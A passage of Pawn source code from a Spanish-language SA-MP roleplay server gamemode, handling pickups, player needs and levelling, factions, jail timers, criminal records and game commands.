		INI_SetTag(Arch, "data");
		A_Format(Str, "Contacto%d", index);
		INI_WriteInt(Arch, Str, num);
		InfoJugador[playerid][jContacto][index] = num;
		A_Format(Str, "C_Nombre%d", index);
		INI_WriteString(Arch, Str, name);
		CambiarNombreContacto(playerid, index, name);
		INI_Close(Arch);
		return 1;
	}
	return 0;
}

CALLBACK: Update_Streamer_(playerid)
{
	return Streamer_Update(playerid);
}

public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
    if(GetPlayerState(playerid) == PLAYER_STATE_DRIVER)
    {
		for(new i; i < sizeof(PinchaRuedas); i++)
		{
			if(PICK_PinchaRuedas[i][0] == pickupid || PICK_PinchaRuedas[i][1] == pickupid)
			{
				new
					Damage[4],
					vehID = GetPlayerVehicleID(playerid);

				GetVehicleDamageStatus(vehID, Damage[0], Damage[1], Damage[2], Damage[3]);
				Damage[3] = 0b1111;
				UpdateVehicleDamageStatus(vehID, Damage[0], Damage[1], Damage[2], Damage[3]);
				SetTimerEx("Update_Streamer_", 1000, false, "i", playerid);
				return 1;
			}
		}
	}
	static
	    UltimoPickup[MAX_PLAYERS];

	if(GetTickCount() - UltimoPickup[playerid] < 3000) return 0;
	UltimoPickup[playerid] = GetTickCount();

	if(pickupid == PElevadorLSPD)
	{
		PlayerPlaySound(playerid, 1138,0,0,0);
		ShowPlayerDialog(playerid,dAscensorLSPD,DIALOG_STYLE_LIST,""#CBLANCO"Ascensor",""#CAZULCLARO"SubSuelo "#CBLANCO"- "#CPOSITIVO"Estacionamiento\n"#CAZULCLARO"Segunda planta "#CBLANCO"- "#CPOSITIVO"Terraza","Ir","Cancelar");
	}
	else if(pickupid == PEstadio)
	{
	    Dialog(playerid, dEstadio, DIALOG_STYLE_LIST, "Estadio de Los Santos" ,""#CAZUL2"> "#CBLANCO"Estadio: "#CVERDE"MotoCross\n"#CAZUL2"> "#CBLANCO"Estadio: "#CVERDE"Rally\n"#CAZUL2"> "#CBLANCO"Estadio: "#CVERDE"CrashArena (CHOQUES)\n"#CAZUL2"> "#CBLANCO"Estadio: "#CVERDE"TC-2000","Aceptar","Cancelar");
	}
	return 1;
}


public OnRconLoginAttempt(ip[], password[], success)
{
	if(success)
	{
		new PJ_IP[25];
		foreach(Player,i)
		{
		    GetPlayerIp(i,PJ_IP,sizeof(PJ_IP));
			if(strlen(PJ_IP) && !strcmp(ip,PJ_IP) && !EsDueno(i))
			{
			    Error(i,"¡Lo sentimos, no puedes loguearte! "#CROJO"KICKEADO");
				return Kick(i);
			}
		}
	}
	return 1;
}


stock Drogarse(playerid,DROGA)
{
	switch(DROGA)
	{
	    case DROGA_MARIHUANA:
	    {
		    SetPlayerWeather(playerid,128);
		    SetPlayerDrunkLevel(playerid,5000);
		    return 1;
		}
	    case DROGA_COCAINA:
	    {
		    SetPlayerWeather(playerid,122);
		    AutoRol(playerid,"aspira cocaina");
		    SetPlayerDrunkLevel(playerid,5000);
		}
		case DROGA_OPIO:
		{
		    SetPlayerWeather(playerid,104);
		    AutoRol(playerid,"aspira opio");
		    SetPlayerDrunkLevel(playerid,5000);
		}
		case DROGA_CANNABIS:
		{
		    SetPlayerWeather(playerid,103);
		    AutoRol(playerid,"aspira cannabis");
		    SetPlayerDrunkLevel(playerid,5000);
		}
	}


 	new
	 	Float:Vida;

  	GetPlayerHealth(playerid,Vida);
  	if((Vida + 5) > 100) SetPlayerHealth(playerid,100);
  	else SetPlayerHealth(playerid,Vida + 5);
	InfoJugador[playerid][jDrogado] ++;
	InfoJugador[playerid][jDroga][DROGA] --;
	return 1;
}

stock AttachObject(playerid,index,modelid,bone,Float:x,Float:y,Float:z,Float:x2,Float:y2,Float:z2,Float:x3=1.0,Float:y3=1.0,Float:z3=1.0)
{
    SetPlayerAttachedObject(playerid,index,modelid,bone,x,y,z,x2,y2,z2,x3,y3,z3);
	InfoJugador[playerid][jAttachModel][index] = modelid;
	InfoJugador[playerid][jAttachBone][index] = bone;
	InfoJugador[playerid][jAttachPosx][index] = x;
	InfoJugador[playerid][jAttachPosy][index] = y;
	InfoJugador[playerid][jAttachPosz][index] = z;
	InfoJugador[playerid][jAttachAngx][index] = x2;
	InfoJugador[playerid][jAttachAngy][index] = y2;
	InfoJugador[playerid][jAttachAngz][index] = z2;
	InfoJugador[playerid][jAttachEscx][index] = x3;
	InfoJugador[playerid][jAttachEscy][index] = y3;
	InfoJugador[playerid][jAttachEscz][index] = z3;
	ActualizarAccesorios(playerid,index);
	return 1;
}

stock DarArmaduraPolicia(playerid,Float:x)
{
    AttachObject(playerid,SLOT_ARMADURA,19142,1,0.099258,0.031748,-0.015871,360.000000,358.979064,357.476074,1.072590,1.239796,-1.046599);
	SetPlayerArmour(playerid,x);
	return 1;
}

stock DarArmaduraGeneral(playerid,Float:Chaleco)
{
	AttachObject(playerid, SLOT_ARMADURA, 373, 1, 0.300327, -0.004779, -0.178271, 73.442504, 25.958881,32.691726,1,1,1);
	SetPlayerArmour(playerid,Chaleco);
	return 1;
}


stock AnuncioGobernamental(Anuncio[])
{
	MensajeTodos(C_NEGRO,"___________________________ "#CBLANCO"Atención - Auncio del gobierno "#CNEGRO"___________________________");
	MensajeTodos(C_GOBIERNO,Anuncio);
}

stock QuitarDinero(playerid,ddinero)
{
	if(ddinero < 0)
	{
		ddinero = -ddinero;
	}
	if((GetPlayerMoney(playerid) - ddinero) < 0)
	{
	    new str[140];
	    
	    A_Format(str, "[BUG] El jugador %s(%d) pretende tener dinero negativo (Tenia %d | Se quitaron: %d | ahora le quedan $%d",
	    pName(playerid), playerid,
	    GetPlayerMoney(playerid),
	    ddinero,
	    GetPlayerMoney(playerid) - ddinero);
	    print(str);
	    MensajeAdmin(C_ROJO, str, Destacado);
	}

	new a[16];
	format(a,sizeof(a),"~r~ -%d$",ddinero);
	GameTextForPlayer(playerid, a, 5000, 1);
	GivePlayerMoney(playerid, -ddinero);
	PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);
	return 1;
}

stock Log(sz_fileName[], sz_input[]) {

	new
		sz_logEntry[156],
		i_dateTime[2][3],
		File: fileHandle = fopen(sz_fileName, io_append);

	gettime(i_dateTime[0][0], i_dateTime[0][1], i_dateTime[0][2]);
	getdate(i_dateTime[1][0], i_dateTime[1][1], i_dateTime[1][2]);

	format(sz_logEntry, sizeof(sz_logEntry), "[%i/%i/%i - %i:%i:%i] %s\r\n", i_dateTime[1][0], i_dateTime[1][1], i_dateTime[1][2], i_dateTime[0][0], i_dateTime[0][1], i_dateTime[0][2], sz_input);
	fwrite(fileHandle, sz_logEntry);
	return fclose(fileHandle);
}


CALLBACK: RotarObjeto(playerid)
{
	new Float:p2[3];
	GetPlayerObjectRot(playerid,Accesorio_Obj[playerid],p2[0],p2[1],p2[2]);
	SetPlayerObjectRot(playerid,Accesorio_Obj[playerid],p2[0],p2[1],p2[2]+1);
	return 1;
}

stock CrearArbolito(Float:x, Float:y, Float:z)
{
	CreateDynamicObject(19076, x, y, z-1.0,0,0,300);//xmas tree
	CreateDynamicObject(19054, x, y+1.0, z-0.4,0,0,300);//XmasBox1
    CreateDynamicObject(19058, x+1.0, y, z-0.4,0,0,300);//XmasBox5
    CreateDynamicObject(19056, x, y-1.0, z-0.4,0,0,300);//XmasBox3
	CreateDynamicObject(19057, x-1.0, y, z-0.4,0,0,300);//XmasBox4
    CreateDynamicObject(19058, x-1.5, y+1.5, z-1.0,0,0,300);//XmasBox5
    CreateDynamicObject(19055, x+1.5, y-1.5, z-1.0,0,0,300);//XmasBox2
    CreateDynamicObject(19057, x+1.5, y+1.5, z-1.0,0,0,300);//XmasBox4
    CreateDynamicObject(19054, x-1.5, y-1.5, z-1.0,0,0,300);//XmasBox1
    CreateDynamicObject(3526, x, y, z-1.0,0,0,300);//Airportlight - for flashing affect
}

stock _CrearArbolito(Float:X, Float:Y, Float:Z)
{
   CreateDynamicObject(3472,X+0.28564453,Y+0.23718262,Z+27.00000000,0.00000000,0.00000000,230.48021);
   CreateDynamicObject(664,X+0.20312500,Y+0.01171875,Z+-3.00000000,0.00000000,0.00000000,0.00000000);
   CreateDynamicObject(3472,X+0.45312500,Y+0.51562500,Z+4.00000000,0.00000000,0.00000000,69.7851562);
   CreateDynamicObject(3472,X+0.65136719,Y+1.84570312,Z+17.00000000,0.00000000,0.00000000,41.863403);
   CreateDynamicObject(7666,X+0.34130859,Y+0.16845703,Z+45.00000000,0.00000000,0.00000000,298.12524);
   CreateDynamicObject(7666,X+0.34082031,Y+0.16796875,Z+45.00000000,0.00000000,0.00000000,27.850342);
   CreateDynamicObject(3472,X+0.45312500,Y+0.51562500,Z+12.00000000,0.00000000,0.00000000,350.02441);
   CreateDynamicObject(3472,X+0.45312500,Y+0.51562500,Z+7.00000000,0.00000000,0.00000000,30.0805664);
   CreateDynamicObject(3472,X+0.45312500,Y+0.51562500,Z+22.00000000,0.00000000,0.00000000,230.47119);
   CreateDynamicObject(1262,X+0.15039062,Y+0.57128906,Z+29.45285416,0.00000000,0.00000000,162.90527);
}

stock EditarAccesorio(playerid,id_accesorio)
{
	new Str[140];
	A_Format(Str,"Editar personalizadamente\nElejir parte "#CINFO"(%s)\nAjustar posición\nOcultar/Mostrar\nEliminar accesorio",AttachmentBones[InfoJugador[playerid][jAttachBone][id_accesorio]-1]);
	Dialog(playerid,dEAccesorios_1,DIALOG_STYLE_LIST,""#CAZUL2"Editar accesorio",Str,"Aceptar","Cancelar");
	return 1;
}

IsPlayerInArea(playerid, Float:MinX, Float:MinY, Float:MaxX, Float:MaxY)
{
    new Float:X, Float:Y, Float:Z;

    GetPlayerPos(playerid, X, Y, Z);
    if(X >= MinX && X <= MaxX && Y >= MinY && Y <= MaxY)
	{
        return 1;
    }
    return 0;
}


stock GetPlayerGangZone(playerid)
{
	Loop(i, MAX_GZS, 0)
	{
	    if(IsValidGangZone(i))
		{
		    if(IsPlayerInArea(
				playerid,
				InfoGZ[i][gzMin][0],
				InfoGZ[i][gzMin][1],
				InfoGZ[i][gzMax][0],
				InfoGZ[i][gzMax][1]))
			{
				return i;
			}
		}
	}
	return (-1);
}

stock ProxDetectorS(Float:radi, playerid, targetid)
{
    if(IsPlayerConnected(playerid) && IsPlayerConnected(targetid))
	{
		new Float:posx, Float:posy, Float:posz;
		new Float:oldposx, Float:oldposy, Float:oldposz;
		new Float:tempposx, Float:tempposy, Float:tempposz;
		GetPlayerPos(playerid, oldposx, oldposy, oldposz);
		GetPlayerPos(targetid, posx, posy, posz);
		tempposx = (oldposx -posx);
		tempposy = (oldposy -posy);
		tempposz = (oldposz -posz);
		if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
		{
			return 1;
		}
	}
	return 0;
}

// ---===[ Sistema de niveles ]====---- //

timer SubeExperiencia[60000]()
{
	new
		TicksC = GetTickCount(),CuentJugadores,TiempoParaBorrar = 1000*60*60*MAX_HORAS_OBJ_T;
	
	//Borrar objetos tirados viejos.
	Loop(i, MAX_OBJETOS_T, 0)
	{
		if(TicksC - InfoObjeto_T[i][TickOBJ] > TiempoParaBorrar)
		{
		    BorrarObjetoTirado(i);
		}
	}
	
	foreach(Player,i)
	{
	    if(GetPVarInt(i,"Logueado") == 1 && InfoJugador[i][jRegistrado])
	    {
	        if(IsPlayerPaused(i)) continue;
	        CuentJugadores++;
			InfoJugador[i][jExperiencia] += 1.0;
			InfoJugador[i][jMinutos] ++;
			//Necesidades
			if(!GetPVarInt(i, "ADMIN_ONDUTY"))
			{
				if(InfoJugador[i][jSexo] == 1)
				{
					if(! (GetPlayerSpecialAction(i) & SPECIAL_ACTION_PISSING) )
					{
						InfoJugador[i][jOrina] += 1.4;
						if(InfoJugador[i][jOrina] >= 100 )
						{
						    if(IsPlayerInAnyVehicle(i)) RemovePlayerFromVehicle(i);
						    AutoRol(i,"no aguantó más, y se meo encima.");
						    cmd_mear(i,"");
						}
					}
				}
				else
				{
					InfoJugador[i][jOrina] += 1.4;
					if(InfoJugador[i][jOrina] >= 100 )
					{
					    if(IsPlayerInAnyVehicle(i)) RemovePlayerFromVehicle(i);
					    AutoRol(i,"no aguantó más, y se meo encima.");
					    cmd_mear(i,"");
					}
				}
				if(!GetPVarInt(i,"COMIENDO") &&  (InfoJugador[i][jHambre]-0.7   ) ) InfoJugador[i][jHambre] -= 0.7;
				if(!GetPVarInt(i,"DURMIENDO") && (InfoJugador[i][jCansancio]-0.4) ) InfoJugador[i][jCansancio] -= 0.4;
				if(InfoJugador[i][jHambre] < 20.0 && !GetPVarInt(i,"COMIENDO"))
				{
				    if(InfoJugador[i][jHambre] < 5)
					{
						new Float:Vida;
						GetPlayerHealth(i,Vida);
						if(Vida - 10)
						{
							SetPlayerHealth(i, Vida-10);
							Mensaje(i,-1,"Tienes MUCHO hambre, y te duele la cabeza. ¡Deberias comer algo!");
						}
						else
						{
							SetPlayerHealth(i,0);
							Mensaje(i,-1,"Tu cuerpo no pudo soportar el hambre, te desmayaste.");
						}
					}
				    else if(InfoJugador[i][jHambre] < 15)
					{
						new Float:Vida;
						GetPlayerHealth(i,Vida);
						if(Vida - 5)
						{
							SetPlayerHealth(i, Vida-5);
							Mensaje(i,-1,"Tienes hambre, y te duele la cabeza. ¡Deberias comer algo!");
						}
						else
						{
							SetPlayerHealth(i,0);
							Mensaje(i,-1,"Tu cuerpo no pudo soportar el hambre, te desmayaste.");
						}
					}
					else if(InfoJugador[i][jHambre] < 25) Mensaje(i,-1,"Comienzas a tener hambre, ¡ve a comer algo!");
				}

				if(InfoJugador[i][jCansancio] < 20 && !GetPVarInt(i,"DURMIENDO"))
				{
					if(InfoJugador[i][jCansancio] < 2.5)
					{
					    AutoRol(i,"cae dormido al suelo");
						cmd_dormir(i,"");
						Mensaje(i,-1,"No aguantaste más, y caiste dormido al suelo.");
					}
					else Mensaje(i,-1,"Comienzas a tener sueño, deberias descansar. "#CINFO"(/dormir)");
				}

				SetProgressBarValue(BHambre[i], InfoJugador[i][jHambre]);
				SetProgressBarValue(BCansancio[i], InfoJugador[i][jCansancio]);
				SetProgressBarValue(BOrina[i], InfoJugador[i][jOrina]);
				if(!GetPVarInt(i,"T_DATOS"))
				{
					UpdateProgressBar(BHambre[i],i);
					UpdateProgressBar(BCansancio[i],i);
					UpdateProgressBar(BOrina[i],i);
				}
			}
			
			if(InfoJugador[i][jMinutos] >= 60)
			{
				InfoJugador[i][jMinutos] = 0;
				InfoJugador[i][jHoras] ++;
			}
			if(InfoJugador[i][jExperiencia] >= ((InfoJugador[i][jNivel]+1)*3)*60)
			{
				SetPlayerScore(i,GetPlayerScore(i) +1 );
				InfoJugador[i][jNivel] = GetPlayerScore(i);
				SetProgressBarMaxValue(BExp[i],((InfoJugador[i][jNivel]+1)*3)*60);
				new D_String[450];
				format(D_String,sizeof(D_String),"\t"#CAMARILLO"* "#CBLANCO"Felicitaciones, ¡ jugaste "#CROJO"%d "#CBLANCO"horas y subiste de nivel !\n\t"#CAMARILLO"* "#CBLANCO"Obtienes beneficios que los deverás averiguar por vos mismo\n\t"#CAMARILLO"* "#CBLANCO"Tu nivel anterior es "#CROJO"%d"#CBLANCO", y tu nuevo nivel es "#CROJO"%d.\n\n\t"#CBLANCO"- Ahora, para alcanzar el nivel %d deverás jugar %d horas "#CROJO"(%d minutos)",
				((((InfoJugador[i][jNivel])*3)*60)/60),//
				(InfoJugador[i][jNivel]-1),//
				(InfoJugador[i][jNivel]),//
				(InfoJugador[i][jNivel]+1),//
				(((InfoJugador[i][jNivel]+1)*3)),
				(((InfoJugador[i][jNivel]+1)*3)*60));
				Dialog(i,dError,DIALOG_STYLE_MSGBOX,""#CPOSITIVO"INFORMACIÓN SOBRE SU NIVEL",D_String,"Cerrar","");
				InfoJugador[i][jExperiencia] = 0;
				printf("- %s subió de nivel [ NIVEL: %d ]" , NombreJugador_(i), InfoJugador[i][jNivel] );

				new
				    Level = GetPlayerScore(i),
					SkillLevel = (Level < 5) ? ((Level*2)*100) : (1000);

				for(new l; l <= 10; l++)
				    SetPlayerSkillLevel(i, l, SkillLevel);

			}

			SetProgressBarValue(BExp[i],InfoJugador[i][jExperiencia]);

			if(!GetPVarInt(i,"T_DATOS"))
			{
				UpdateProgressBar(BExp[i],i);
			}
	        ActualizarCuenta(i);
		}
	}
	if(CuentJugadores)
	{
		printf("- Cuentas actualizadas: [%d CUENTAS | TIEMPO: %d MS | %d JUGADORES]",CuentJugadores,GetTickCount() - TicksC,Iter_Count(Player));
	}

	return 1;
}

stock EsRopaMujer(id)
{
	switch(id)
	{
	    case 9,10..13,31,38,39,40,41,53..56,65,69,76,77,85,88,89,91,93,129..131,138,139,140,141:
	    {
	        return 1;
		}
		case 148,150,151,152,157,169,172,190..199,201,214..216,219,224,225,226,232,233,251,298:
		{
		    return 1;
		}
	}
	return 0;
}

stock EsRopaProhibida(id)
{
	switch(id)
	{
	    case 63,64,71,75,87,90,92,138,145,162..166,178,207,205,237,238,243,244,245,246,256,257,263,265..267,274..288:
		{
		    return 1;
		}
	}
	return 0;
}

stock RopaPandilla(pandilla, skin)
{
	switch(skin)
	{
	    case 102..104://Ballas
		{
			if(pandilla == 2) return true;
		}
		case 105..107://Groove
		{
			if(pandilla == 1) return true;
		}
		case 114..116://Sureños
		{
			if(pandilla == 3) return true;
		}
		default: return true;
	}
	return false;
}

stock SetGreyLifePos(playerid, Float: start, Float: end)
{
	if(start < 0.0) start = 0.0;
	if(end > 100.0) end = 100.0;

	static
		Float: Val_0,
		Float: Val_1;

	if(Val_0 == 0.0)
	{
	    Val_0 = floatdiv(100.0, 60.0);
	}
	if(Val_1 == 0.0)
	{
	    Val_1 = floatdiv(100.0, 58.0);
	}

	/*

	610-550=60
	60.x=100 -> x=1.666666

	602-544=58;
	58.x=100 -> 1.7241

	*/
	start = floatdiv(start, Val_0);
	start += 550.0;

	end = floatdiv(end, Val_1);
	end += 544.0;

	if(BarraGris[playerid] != PlayerText:INVALID_TEXT_DRAW)
	{
		PlayerTextDrawDestroy(playerid, BarraGris[playerid]);
	}
    BarraGris[playerid] = CreatePlayerTextDraw(playerid, start, 71.0, "_");
	PlayerTextDrawBackgroundColor(playerid, BarraGris[playerid], 255);
	PlayerTextDrawFont(playerid, BarraGris[playerid], 1);
	PlayerTextDrawLetterSize(playerid, BarraGris[playerid], 0.5000000, -0.0900000);
	PlayerTextDrawColor(playerid, BarraGris[playerid], -1);
	PlayerTextDrawSetProportional(playerid, BarraGris[playerid], 1);
	PlayerTextDrawSetShadow(playerid, BarraGris[playerid], 1);
	PlayerTextDrawUseBox(playerid, BarraGris[playerid], 1);
	PlayerTextDrawBoxColor(playerid, BarraGris[playerid], 2105376255);
	PlayerTextDrawTextSize(playerid, BarraGris[playerid], end, 0.000000);
	PlayerTextDrawShow(playerid, BarraGris[playerid]);
	return 1;
}

CALLBACK: ActualizarFacciones()
{
	new
		i,
		ArchU[20*MAX_FACCIONES];
		
	while(i++ != MAX_FACCIONES-1)
	{
	    format(ArchU,sizeof(ArchU),"Facciones/%i.ini",i);
	    new INI:Arch = INI_Open(ArchU);
		if(!fexist(ArchU))
		{
		    INI_Create(ArchU);
		}
		INI_SetTag(Arch,"data");
	   	INI_WriteInt(Arch,"Dinero",InfoFaccion[i][fDinero]);

	    INI_WriteString(Arch,"Contraseña",InfoFaccion[i][fContra]);
	    INI_WriteInt(Arch,"Miembros",InfoFaccion[i][fMiembros]);
	    INI_WriteString(Arch,"Lider",InfoFaccion[i][fLider]);
		INI_Close(Arch);
	}
	return 1;
}

CALLBACK: CargarFacciones()
{
	new i,ArchU[16*MAX_FACCIONES];
	while(i<MAX_FACCIONES+1)
	{
	    format(ArchU,sizeof(ArchU),"Facciones/%i.ini",i);
		INI_ParseFile(ArchU, "CargarFaccion_%s", .bExtra = true, .extra = i);
		i++;
	}
	return 1;
}

CALLBACK: CargarFaccion_data(fid,name[],value[])
{
	INI_Int("Dinero",InfoFaccion[fid][fDinero]);
	INI_String("Contraseña",InfoFaccion[fid][fContra],32);
	INI_String("Lider",InfoFaccion[fid][fLider],MAX_PLAYER_NAME);
	INI_Int("Miembros",InfoFaccion[fid][fMiembros]);
	return 1;
}

stock INI_Create(filename[]) {
	new File:fhnd;
	if (fexist(filename)) return false;
	fhnd=fopen(filename,io_write);
	fclose(fhnd);
	return true;
}


stock MostrarGPS(playerid)
{
	if(!InfoJugador [playerid][jBuscadorVeh])
		Dialog(playerid,dGPS_0,DIALOG_STYLE_LIST,""#CAZUL2"GPS - menú principal","> Negocios\n> Trabajos\n> Lugares públicos\n> Concesionarios","Aceptar","Cancelar");
	else
		Dialog(playerid,dGPS_0,DIALOG_STYLE_LIST,""#CAZUL2"GPS - menú principal","> Negocios\n> Trabajos\n> Lugares públicos\n> Concesionarios\n> Buscar un vehículo","Aceptar","Cancelar");

	return 1;
}

CALLBACK: ActualizarTiempoCarcel(playerid)
{
	if(IsPlayerPaused(playerid)) return 1;
	if(InfoJugador[playerid][jEncarcelado] == 0)
	{
	    KillTimer2(playerid,TIMER_CARCEL);
		return 1;
	}
	InfoJugador[playerid][jTiempoCarcel] --;
	if(InfoJugador[playerid][jEncarcelado] == 1)
	{
		new Str[46];
		A_Format(Str,"~w~~n~~n~~n~~n~~n~~n~~n~~n~%d ~g~~h~segs",InfoJugador[playerid][jTiempoCarcel]);
		GameTextForPlayer(playerid,Str,2000,3);
	}
	else if(InfoJugador[playerid][jEncarcelado] == 2)
	{
		new
			LabelString[350],
			OtherStr[38],
			hour_ = InfoJugador[playerid][jTiempoCarcel]/3600,
			min_ = (InfoJugador[playerid][jTiempoCarcel] % 3600) / 60,
			seg_ = (InfoJugador[playerid][jTiempoCarcel] % 60) % 60;

		A_Format(OtherStr, ""#CAZULRARO"Falta: "#CROJO"%dh %dm %ds", hour_, min_, seg_);

		strcat(LabelString, TextoDeCarcel);
		strcat(LabelString, OtherStr);

		UpdatePlayer3DTextLabelText(playerid, TextoCarcel[playerid], C_ROJO, LabelString);
	}

	if(InfoJugador[playerid][jTiempoCarcel] <= 0)
	{
	    DeletePlayer3DTextLabel(playerid, TextoCarcel[playerid]);
	    TextoCarcel[playerid] = PlayerText3D:INVALID_3DTEXT_ID;
		SetPlayerPos(playerid,241.2713,115.3876,1003.2257);
		SetPlayerVirtualWorld(playerid, 0);
		SetPlayerInterior(playerid, 10);
		if(InfoJugador[playerid][jEncarcelado] == 1)
		{
			GameTextForPlayer(playerid,"~g~~h~libre",5000,3);
			Mensaje(playerid,-1,"Tu condena finalizó. Tus antecedentes quedaron registrados a la "#CAZUL"policía"#CBLANCO", ¡ten más cuidado!");
		}
		else
		{
			GameTextForPlayer(playerid,"~g~~h~condena finalizada",5000,3);
			Mensaje(playerid,-1,"Tu condena terminó. La próxima vez, piensalo dos veces antes de cometer una infracción");
		}
		KillTimer2(playerid,TIMER_CARCEL);
		CongelarEx(playerid, 3);
		InfoJugador[playerid][jEncarcelado] = 0;
		InfoJugador[playerid][jTiempoCarcel] = 0;
		return 1;
	}
	return 1;
}

CALLBACK: MantenerPosicionEx(playerid,Float:X,Float:Y,Float:Z) return SetPlayerPos(playerid,X,Y,Z),1;

stock CheckRangoADM(playerid)
{
	new rango[60];
	if(InfoJugador[playerid][jAdmin])
	{
		switch(InfoJugador[playerid][jAdmin])
		{
			case Destacado: 		rango = ""#CDESTACADO"Usuario Destacado";
			case Ayudante: 			rango = ""#CAYUDANTE"Ayudante";
			case Moderador: 		rango = ""#CMODERADOR"Moderador";
			case Mod.Superior: 		rango = ""#CMOD.SUPERIOR"Administrador";
			case Administrador:		rango = ""#CADMINISTRADOR"Adm. superior";
			case AdministradorSup:	rango = ""#CADMINISTRADOR"Adm. general";
			case SubDueno:			rango = ""#CSUBDUENO"Adm. encargado";
			case Dueno:				rango = ""#CDUENO"Director";
		}
	}
	return rango;
}

stock DialogGPS(playerid)
{
	return 1;
}

stock CambiarRopa(playerid,skinid,slot)
{
	switch(InfoJugador[playerid][jSexo])
	{
	    case 1: SetPlayerSkin(playerid,252);
	    case 2: SetPlayerSkin(playerid,140);
	}
	AutoRol(playerid,"se está cambiando");
	SetTimerEx("CambiarEx",4000,false,"ii",playerid,skinid);
	InfoJugador[playerid][jRopa][slot] = skinid;
	GameTextForPlayer(playerid,"~w~Cambiando ropa...",4000,3);
	CongelarEx(playerid,4);
	return 1;
}

CALLBACK: CambiarEx(playerid,skinid)
{
	SetPlayerSkin(playerid,skinid);
	cmd_do(playerid, "Cambiado");
	return 1;
}

stock MostrarVelocimetro(playerid)
{
	SetPVarInt(playerid,"MOSTRO_VELOCIMETRO",1);
	Loop(i,5,0) TextDrawShowForPlayer(playerid,Velocimetro[i]);
	PlayerTextDrawShow(playerid,VelocidadV[playerid]);
	UpdateProgressBar(BCombustible[playerid],playerid);
	UpdateProgressBar(BEstadoVeh[playerid],playerid);
	TextDrawHideForPlayer(playerid,HS);
	TextDrawHideForPlayer(playerid,HoraB);
}

stock SacarVelocimetro(playerid)
{
	Loop(i,5,0) TextDrawHideForPlayer(playerid,Velocimetro[i]);
	PlayerTextDrawHide(playerid,VelocidadV[playerid]);
 	DeletePVar(playerid,"MOSTRO_VELOCIMETRO");
	HideProgressBarForPlayer(playerid,BCombustible[playerid]);
	HideProgressBarForPlayer(playerid,BEstadoVeh[playerid]);
	TextDrawShowForPlayer(playerid,HS);
	TextDrawShowForPlayer(playerid,HoraB);
	PlayerTextDrawHide(playerid, TDContadorKM[playerid] );
}

stock NPCTalk(npcid, text[])
{
	new
	    Time = strlen(text) * 150;

	SetPlayerChatBubble(npcid, text, C_INFO, 10.0, Time);
	return Time;
}

stock BuscarAntecedente(playerid, where[], time[], index)
{
	if( !(0 <= index <= MAX_ANTECEDENTES) ) return 0;

	new
	    String[30],
		Path[60];

	A_Format(Path, "Facciones/LSPD/Antecedentes/%d.ini", InfoJugador[playerid][jDNI]);
	if(!fexist(Path))
	{
	    return 2;
	}

	SetPVarInt(playerid, "Cargar_Antecedente", index);
	// Extraccion
	INI_ParseFile(Path, "Ant_%s", .bExtra = true, .extra = playerid);
	//Terminada extraccion, comienza a almacenar
	DeletePVar(playerid, "Cargar_Antecedente");

	A_Format(String, "Antecedente%d", index);
	GetPVarString(playerid, String, where, MAX_CARACTERES_ANTECEDENTE);
	DeletePVar(playerid, String);

	A_Format(String, "AFecha%d", index);
	GetPVarString(playerid, String, time, 30);
	DeletePVar(playerid, String);
	return 1;
}

CALLBACK: Ant_antecedentes(playerid, name[], value[])
{
	new
	    i = GetPVarInt(playerid, "Cargar_Antecedente"),
	    Str[30];

	A_Format(Str, "Antecedente%d", i);
	if(!strcmp(name, Str))
	{
	    SetPVarString(playerid, Str, value);
	    return 1;
	}
	A_Format(Str, "AFecha%d", i);
	if(!strcmp(name, Str))
	{
	    SetPVarString(playerid, Str, value);
	}

	return 1;
}


stock AgregarAntecedente(playerid, antecedente[], index=-1)
{
	if( (index >= MAX_ANTECEDENTES) || strlen(antecedente) > MAX_CARACTERES_ANTECEDENTE) return 0;

	new
	    String[30], String2[30],
		Path[60],
		INI: Arch,
		Date[3];

	A_Format(Path, "Facciones/LSPD/Antecedentes/%d.ini", InfoJugador[playerid][jDNI]);

	if(index < 0)
	{
	    if(fexist(Path))
	    {
			new
			    File: LinesC = fopen(Path, io_read),
			    Lines, Store[MAX_CARACTERES_ANTECEDENTE];

			while(fread(LinesC, Store))//Total de lineas.
			    Lines++;

			Lines -= 1;//Tag
			Lines /= 2;//Lineas, cada ant tine dos lineas.

			index = Lines;
			if(index >= MAX_ANTECEDENTES) //Si no hay mas espacio, se sobreescribe el PRIMER antecedente
			    index = 0;
		}
		else index = 0;
	}

	Arch = INI_Open(Path);
	INI_SetTag(Arch, "antecedentes");

	A_Format(String, "Antecedente%d", index);
	INI_WriteString(Arch, String, antecedente);

	getdate(Date[0], Date[1], Date[2]);
	A_Format(String, "%02d/%02d/%02d", Date[2], Date[1], Date[0]);
	A_Format(String2,"AFecha%d", index);
	INI_WriteString(Arch, String2, String);

	INI_Close(Arch);
	return 1;
}

CALLBACK: MinearMineral(playerid)
{
	ApplyAnimation(playerid, "BASEBALL", "BAT_4", 4.0, 1, 1, 1, 1, 0);
	return 1;
}

// ----=======[ COMANDOS GENERALES ]=====-------- //

/*	CMD:speed(playerid, params[])
	{
	    #define MAX 500000
	    new
	        t = GetTickCount();
	        
		for(new i; i < MAX; i++)
		{
		    for(new a; a < 150; a++)
      		{
			}
	    		//OnUnoccupiedVehicleUpdate(65, playerid, 1);
		}
		new
		    old = GetTickCount(),
			time = old-t;
			
		printf("Tiempo (%d veces): %d | Tiempo (1 vez): %f || TEST 150 JUGADORES", MAX, time, floatdiv(time, MAX) );
		return 1;
	}*/
	
	CMD:reglas(playerid, params[])
	{
	    new
	        dialog[sizeof(Reglas)*30],
			str[30];
	        
		Loop(i, sizeof(Reglas), 0)
		{
			A_Format(str, "» %s\n", Reglas[i][eTitulo]);
			strcat(dialog, str);
		}
		Dialog(playerid, dReglas, DIALOG_STYLE_LIST, ""#CAZULRARO"Reglas y conceptos", dialog, "Ver", "Cerrar");
		return 1;
	}
	
	CMD:suicidio(playerid,params[])
	{
	    if(InfoJugador[playerid][jMuerto] == false)
	        return Error(playerid, "¡Debe estar agonizando para usar este comando!");
	        
		SetPlayerHealth(playerid, 0);
		QuitarDinero(playerid, 1000);
		AutoRol(playerid, "toma un vidrio y se corta las venas");
		return 1;
	}
	
	CMD:verpresos(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    Para_Admin_Servicio
	    new
			str[MAX_PLAYER_NAME + 20],
			str2[sizeof(str)*10];

	    foreach(Player, i)
	    {
	        if(InfoJugador[i][jEncarcelado])
	        {
